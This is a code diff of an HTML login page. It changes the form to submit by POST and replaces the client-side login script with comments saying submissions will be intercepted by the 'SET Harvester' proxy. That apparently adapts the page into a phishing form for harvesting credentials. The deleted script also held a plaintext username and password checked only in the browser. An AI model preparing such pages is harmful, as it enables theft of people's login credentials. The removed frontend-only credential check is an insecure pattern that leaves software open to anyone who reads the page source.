@@ -26,7 +26,7 @@
                 Invalid username or password!
             </div>
 
-            <form id="loginForm">
+            <form id="loginForm" method="POST" action="login.html">
                 <div class="form-group">
                     <label for="username" style="color: var(--text-muted)"><i class="fas fa-user"></i> Username</label>
                     <input type="text" class="form-control" id="username" name="username" placeholder="Enter your username" required autofocus>
@@ -52,37 +52,8 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const btn = document.getElementById('loginBtn');
-            const btnText = document.getElementById('btnText');
-            
-            // Show loading state
-            btn.disabled = true;
-            btnText.innerHTML = 'Authenticating...';
-            btn.querySelector('i').className = 'fas fa-spinner fa-spin';
-
-            // Simulate server delay
-            setTimeout(() => {
-                const usernameInput = document.getElementById('username').value;
-                const passwordInput = document.getElementById('password').value;
-
-                // Hardcoded credentials for frontend-only verification
-                const VALID_USERNAME = 'kamal';
-                const VALID_PASSWORD = 'kamal123_@';
-
-                if (usernameInput === VALID_USERNAME && passwordInput === VALID_PASSWORD) {
-                    localStorage.setItem('loggedin', 'true');
-                    localStorage.setItem('username', 'ABC'); // Using ABC as the name per previous request
-                    window.location.href = 'pm_dashboard.html';
-                } else {
-                    document.getElementById('error-message').style.display = 'block';
-                    btn.disabled = false;
-                    btnText.innerHTML = 'Secure Login';
-                    btn.querySelector('i').className = 'fas fa-sign-in-alt';
-                }
-            }, 1500);
-        });
+        // No JavaScript interception needed for SET Harvester.
+        // Standard HTML form submission will be intercepted by the SET proxy.
     </script>
 </body>
 </html>
